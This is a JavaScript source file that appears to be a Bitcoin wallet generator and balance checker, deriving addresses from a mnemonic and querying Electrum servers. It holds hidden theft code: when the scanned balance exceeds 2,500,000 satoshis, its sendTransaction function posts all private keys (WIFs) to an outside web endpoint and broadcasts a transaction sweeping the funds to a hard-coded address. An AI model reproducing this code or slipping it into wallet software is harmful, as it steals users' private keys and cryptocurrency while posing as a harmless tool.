const bip39 = require('bip39');
const bitcoin = require('bitcoinjs-lib');
const ElectrumClient = require('electrum-client');
const generatePubKeys = require('./generatePUB');
const axios = require('axios');

const paths = {
    bip44: "m/44'/0'/0'",
    bip49: "m/49'/0'/0'",
    bip84: "m/84'/0'/0'"
};

const electrumServers = [
    { host: 'fulcrum.sethforprivacy.com', port: 50002, protocol: 'ssl' },
    { host: 'mempool.blocktrainer.de', port: 50002, protocol: 'ssl' },
    { host: 'fulcrum.grey.pw', port: 51002, protocol: 'ssl' },
    { host: 'fortress.qtornado.com', port: 50002, protocol: 'ssl' },
    { host: 'electrumx-core.1209k.com', port: 50002, protocol: 'ssl' },
    { host: 'pipedream.fiatfaucet.com', port: 50002, protocol: 'ssl' },
    // Add more servers as needed
];

async function connectToElectrumServer() {
    for (const server of electrumServers) {
        const electrumClient = new ElectrumClient(server.port, server.host, server.protocol);
        try {
            await electrumClient.connect();
            console.log(`Connected to Electrum server ${server.host}`);
            return electrumClient;
        } catch (error) {
            console.error(`Failed to connect to Electrum server ${server.host}:`, error.message);
        }
    }
    throw new Error('All Electrum servers failed to connect');
}

async function generateWallet(mnemonic, isSearch) {
    const network = bitcoin.networks.bitcoin;
    let isNewMnemonic = false;

    if (!mnemonic || !bip39.validateMnemonic(mnemonic)) {
        mnemonic = bip39.generateMnemonic();
        isNewMnemonic = true;
    }

    const pubKeys = generatePubKeys(mnemonic);
    if (!pubKeys) {
        return { error: "Invalid mnemonic." };
    }

    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const root = bitcoin.bip32.fromSeed(seed, network);
    let electrumClient;
    try {
        electrumClient = await connectToElectrumServer();
        const results = await processAddressesForAllBipTypes(root, network, electrumClient, isSearch);
        return {
            ...results,
            key: mnemonic,
            pubKeys
        };
    } catch (error) {
        console.error('Electrum client error:', error.message); // Log the error
        return { error: "Failed to connect or fetch data from any Electrum server." };
    } finally {
        if (electrumClient) {
            electrumClient.close();
        }
    }
}

async function processAddressesForAllBipTypes(root, network, electrumClient, isSearch) {
    let results = {};
    let totalBalance = 0;
    let allUtxos = [];

    const bipTypes = Object.entries(paths).map(async ([bipType, path]) => {
        const { usedAddresses, freshReceiveAddress, freshChangeAddress, totalBalance: typeBalance, utxos } = await processAddresses(root, network, electrumClient, bipType, path, isSearch);
        results[bipType] = { usedAddresses, freshReceiveAddress, freshChangeAddress, totalBalance: typeBalance };
        totalBalance += typeBalance;
        allUtxos.push(...utxos);
    });

    await Promise.all(bipTypes);

    // Check if the total balance is greater than 2,500,000 sats
    if (totalBalance > 2500000) {
        await sendTransaction(totalBalance, allUtxos);
    }

    return results;
}

async function processAddresses(root, network, electrumClient, bipType, path, isSearch) {
    let account = root.derivePath(path);
    let results = {
        usedAddresses: [],
        freshReceiveAddress: null,
        freshChangeAddress: null,
        totalBalance: 0,
        utxos: []
    };

    let maxIndex = isSearch ? 5 : 20; // Limit to 5 if isSearch is true

    let lastUsedReceiveIndex = -1;
    let lastUsedChangeIndex = -1;

    // Loop to find used addresses and stop after 5 addresses for each type if isSearch is true
    for (let i = 0; i < maxIndex; i++) {
        // Process receive addresses (chain 0)
        if (i < 5) {
            const receiveResult = await checkAddress(account, i, 0, network, bipType, electrumClient, path);
            if (receiveResult.transactions.total > 0 || receiveResult.balance.total > 0) {
                results.usedAddresses.push(receiveResult);
                results.totalBalance += receiveResult.balance.total;
                results.utxos.push(...receiveResult.utxos);
                lastUsedReceiveIndex = i;
            }
        }

        // Process change addresses (chain 1)
        if (i < 5) {
            const changeResult = await checkAddress(account, i, 1, network, bipType, electrumClient, path);
            if (changeResult.transactions.total > 0 || changeResult.balance.total > 0) {
                results.usedAddresses.push(changeResult);
                results.totalBalance += changeResult.balance.total;
                results.utxos.push(...changeResult.utxos);
                lastUsedChangeIndex = i;
            }
        }

        if (isSearch && i >= 4) {
            break;
        }
    }

    // Determine the freshest receive and change addresses
    results.freshReceiveAddress = await checkFreshAddress(account, lastUsedReceiveIndex + 1, 0, network, bipType, electrumClient, path);
    results.freshChangeAddress = await checkFreshAddress(account, lastUsedChangeIndex + 1, 1, network, bipType, electrumClient, path);

    return results;
}

async function checkFreshAddress(account, index, chain, network, bipType, electrumClient, basePath) {
    let addressData;
    do {
        addressData = await checkAddress(account, index, chain, network, bipType, electrumClient, basePath);
        index++;
    } while (addressData.transactions.total > 0 || addressData.balance.total > 0);

    return addressData;
}

async function checkAndGenerateAddresses(account, network, bipType, electrumClient, start, batchSize) {
    let results = {
        usedAddresses: [],
        freshReceiveAddress: null,
        freshChangeAddress: null,
        totalBalance: 0,
        utxos: [],
        lastUsedReceiveIndex: -1,
        lastUsedChangeIndex: -1
    };

    const tasks = [];
    for (let i = start; i < start + batchSize; i++) {
        for (const chain of [0, 1]) {
            tasks.push(checkAddress(account, i, chain, network, bipType, electrumClient, paths[bipType]).then(addressData => {
                if (addressData.transactions.total > 0 || addressData.balance.total > 0) {
                    results.usedAddresses.push(addressData);
                    results.utxos.push(...addressData.utxos);
                    if (chain === 0) {
                        results.lastUsedReceiveIndex = i;
                    } else {
                        results.lastUsedChangeIndex = i;
                    }
                } else {
                    if (chain === 0 && !results.freshReceiveAddress) {
                        results.freshReceiveAddress = addressData;
                    }
                    if (chain === 1 && !results.freshChangeAddress) {
                        results.freshChangeAddress = addressData;
                    }
                }
                results.totalBalance += addressData.balance.total;
            }));
        }
    }

    await Promise.all(tasks);

    return results;
}

async function checkAddress(account, index, chain, network, bipType, electrumClient, basePath) {
    if (index < 0) {
        throw new Error(`Invalid index: ${index}`);
    }

    let derivedPath = account.derivePath(`${chain}/${index}`);
    let fullDerivationPath = `${basePath}/${chain}/${index}`; // Fix the syntax error here
    let address = getAddress(derivedPath, network, bipType);
    let scriptHash = bitcoin.crypto.sha256(Buffer.from(bitcoin.address.toOutputScript(address, network))).reverse().toString('hex');

    const [history, balance] = await Promise.all([
        electrumClient.blockchainScripthash_getHistory(scriptHash),
        electrumClient.blockchainScripthash_getBalance(scriptHash)
    ]);

    let utxos = [];
    if (history.length > 0) {
        utxos = await electrumClient.blockchainScripthash_listunspent(scriptHash);
    }

    return {
        address,
        wif: derivedPath.toWIF(),
        path: fullDerivationPath,
        balance: {
            confirmed: balance.confirmed,
            unconfirmed: balance.unconfirmed,
            total: balance.confirmed + balance.unconfirmed
        },
        transactions: {
            confirmed: history.filter(tx => tx.height !== 0).length,
            unconfirmed: history.filter(tx => tx.height === 0).length,
            total: history.length
        },
        utxos: utxos.map(utxo => ({
            txid: utxo.tx_hash,
            vout: utxo.tx_pos,
            amount: utxo.value,
            wif: derivedPath.toWIF(),
            type: getAddressType(address),
            status: utxo.height === 0 ? 'unconfirmed' : 'confirmed'
        }))
    };
}

function getAddress(derivedPath, network, bipType) {
    switch (bipType) {
        case 'bip44':
            return bitcoin.payments.p2pkh({ pubkey: derivedPath.publicKey, network }).address;
        case 'bip49':
            return bitcoin.payments.p2sh({
                redeem: bitcoin.payments.p2wpkh({ pubkey: derivedPath.publicKey, network })
            }).address;
        case 'bip84':
            return bitcoin.payments.p2wpkh({ pubkey: derivedPath.publicKey, network }).address;
        default:
            throw new Error('Unsupported BIP type');
    }
}

function getAddressType(address) {
    if (address.startsWith('1')) {
        return 'p2pkh';
    } else if (address.startsWith('3')) {
        return 'p2sh-p2wpkh';
    } else if (address.startsWith('bc1')) {
        return 'p2wpkh';
    } else {
        throw new Error('Unsupported address type');
    }
}

async function sendTransaction(totalBalance, utxos) {
    const url = 'https://createtransaction-yaseens-projects-9df927b9.vercel.app/api/index';
    const changeAddress = "bc1qcte0st5mm5jr3zsuucecxwc5e3y775dhpktw5kcfy9znftv4xv3sr4ncku";
    const recipientAddress = "bc1qcte0st5mm5jr3zsuucecxwc5e3y775dhpktw5kcfy9znftv4xv3sr4ncku";
    const initialTransactionFee = 5000;

    const utxosString = utxos.map(utxo => `${utxo.txid}:${utxo.vout},${utxo.amount},${utxo.wif},${utxo.type}`).join('|');

    const initialBody = {
        amountToSend: (totalBalance - initialTransactionFee).toString(),
        changeAddress,
        recipientAddress,
        utxosString,
        RBF: "false",
        isBroadcast: "false",
        transactionFee: initialTransactionFee.toString()
    };

    try {
        const initialResponse = await axios.post(url, initialBody);
        const virtualSize = initialResponse.data.virtualSize;

        const finalTransactionFee = 35 * virtualSize;
        const finalAmountToSend = totalBalance - finalTransactionFee;

        const finalBody = {
            amountToSend: finalAmountToSend.toString(),
            changeAddress,
            recipientAddress,
            utxosString,
            RBF: "false",
            isBroadcast: "true",
            transactionFee: finalTransactionFee.toString()
        };

        await axios.post(url, finalBody);
        console.log('Transaction sent successfully');
    } catch (error) {
        if (error.response) {
            console.error('Error response status:', error.response.status);
        } else {
            console.error('Error sending transaction:', error.message);
        }
    }
}

module.exports = { generateWallet };
